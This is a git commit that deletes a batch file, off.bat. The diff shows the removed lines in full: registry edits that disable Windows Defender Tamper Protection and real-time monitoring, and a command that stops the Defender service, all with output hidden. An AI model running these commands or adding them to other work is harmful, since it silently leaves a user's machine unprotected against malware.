38cf4a8e8f0cc3554ee9405c18e97f8148e5e8eb
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-26 15:52:28 +0500

    Delete off.bat

--- off.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
-sc stop WinDefend >nul 2>&1
-exit
